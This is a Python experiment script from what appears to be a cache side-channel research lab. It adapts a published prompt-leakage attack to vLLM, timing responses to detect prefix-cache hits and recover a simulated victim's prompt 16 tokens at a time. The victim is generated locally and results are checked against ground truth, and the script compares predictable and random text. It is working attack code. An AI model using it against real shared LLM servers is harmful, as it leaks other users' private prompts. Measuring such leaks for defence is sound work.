#!/usr/bin/env python
"""Experiment 9 - vLLM block-granular content recovery (Path A).
Adapts PROMPTPEEK (NDSS 2025): auxiliary-LLM candidate + prefix-cache oracle. Their oracle is
SGLang LPM return-order (per token); ours is vLLM TTFT (per 16-token block). Design+sources:
claude/experiments/exp09-vllm-block-recovery.md. Decision by TTFT; hits_delta + true target
score only. Candidate gen runs under a throwaway salt so it can't pollute the victim namespace.
"""
from __future__ import annotations
import argparse, random, statistics, string, sys, time, uuid
from pathlib import Path
import requests
sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "src"))
from cachelab.config import Config
from cachelab.client import TimingClient
from cachelab.groundtruth import labeled_request
from cachelab.server import wait_until_healthy

GEN_SALT = "attacker-gen-" + uuid.uuid4().hex
BLOCK = 16

def generate(base_url, model, prompt, n, temperature, max_tokens=BLOCK):
    payload = {"model": model, "prompt": prompt, "max_tokens": max_tokens,
               "temperature": temperature, "n": n, "stream": False, "cache_salt": GEN_SALT}
    r = requests.post(f"{base_url}/completions", json=payload, timeout=120)
    r.raise_for_status()
    return [c["text"] for c in r.json()["choices"]]

def probe_ttft(client, cfg, text, repeats=3):
    ttfts, hd = [], None
    for i in range(repeats):
        if i == 0:
            with labeled_request(cfg) as box:
                m = client.measure(cfg.model.name, text, max_tokens=1, user="attacker_user", cache_salt=None)
            hd = box[0].hits_delta if box[0] else None
        else:
            m = client.measure(cfg.model.name, text, max_tokens=1, user="attacker_user", cache_salt=None)
        if m.ok and m.client_ttft is not None:
            ttfts.append(m.client_ttft)
        time.sleep(cfg.timing.inter_request_delay)
    return (statistics.median(ttfts) if ttfts else None), hd

def recover(client, cfg, base_url, prefix, victim_text, n_blocks, k, threshold):
    recovered = prefix; correct = probes = 0
    for b in range(n_blocks):
        cands = []
        try:
            cands += generate(base_url, cfg.model.name, recovered, n=1, temperature=0.0)
            cands += generate(base_url, cfg.model.name, recovered, n=max(k - 1, 0), temperature=0.8)
        except Exception as e:
            print(f"      [gen error: {e}]"); break
        seen, uniq = set(), []
        for c in cands:
            if c and c not in seen: seen.add(c); uniq.append(c)
        best = best_ttft = best_hd = None
        for c in uniq:
            med, hd = probe_ttft(client, cfg, recovered + c); probes += 1
            if med is None: continue
            if med < threshold and (best_ttft is None or med < best_ttft):
                best, best_ttft, best_hd = c, med, hd
        if best is None:
            print(f"      block {b}: STALL (no candidate read as a cache hit)"); break
        is_correct = victim_text.startswith((recovered + best))
        gt_ok = (best_hd is not None and best_hd > 0)
        recovered += best; correct += int(is_correct and gt_ok)
        print(f"      block {b}: {'OK' if (is_correct and gt_ok) else 'WRONG'} "
              f"(ttft={best_ttft*1000:.1f}ms hits_delta={best_hd}) +{best[:24]!r}")
        if not (is_correct and gt_ok): break
    return correct, probes

def main() -> int:
    a = argparse.ArgumentParser()
    a.add_argument("--config", default="config/_smoke.yaml")
    a.add_argument("--blocks", type=int, default=4)
    a.add_argument("--k", type=int, default=8)
    args = a.parse_args()
    cfg = Config.load(args.config)
    print("[*] waiting for vLLM server health...")
    if not wait_until_healthy(cfg):
        print("[!] server not healthy", file=sys.stderr); return 1
    client = TimingClient(cfg.server.base_url); base_url = cfg.server.base_url
    delay = cfg.timing.inter_request_delay
    try:
        for regime in ("predictable", "random"):
            tag = uuid.uuid4().hex
            prefix = f"{tag} The following is a standard disclosure notice. Section 1:"
            if regime == "predictable":
                target = generate(base_url, cfg.model.name, prefix, n=1, temperature=0.0, max_tokens=args.blocks * BLOCK)[0]
            else:
                target = " " + " ".join("".join(random.choice(string.ascii_lowercase) for _ in range(5)) for _ in range(args.blocks * BLOCK))
            victim_text = prefix + target
            client.measure(cfg.model.name, victim_text, max_tokens=1, user="victim_user", cache_salt=None)
            time.sleep(delay)
            hit_ref, _ = probe_ttft(client, cfg, prefix, repeats=8)
            miss_ref, _ = probe_ttft(client, cfg, prefix + " " + uuid.uuid4().hex * 2, repeats=8)
            if hit_ref is None or miss_ref is None or miss_ref <= hit_ref:
                print(f"\n=== {regime} ===\n    [!] no usable timing separation (hit={hit_ref}, miss={miss_ref})"); continue
            threshold = (hit_ref + miss_ref) / 2.0
            print(f"\n=== {regime} regime ===")
            print(f"    calib: hit={hit_ref*1000:.1f}ms miss={miss_ref*1000:.1f}ms thr={threshold*1000:.1f}ms")
            correct, probes = recover(client, cfg, base_url, prefix, victim_text, args.blocks, args.k, threshold)
            print(f"    --> recovered {correct}/{args.blocks} blocks  ({probes} probes)")
    finally:
        client.close()
    print("\n    Expect: predictable recovers most blocks; random ~0 (block_size=16 seals high-entropy).")
    return 0

if __name__ == "__main__":
    raise SystemExit(main())
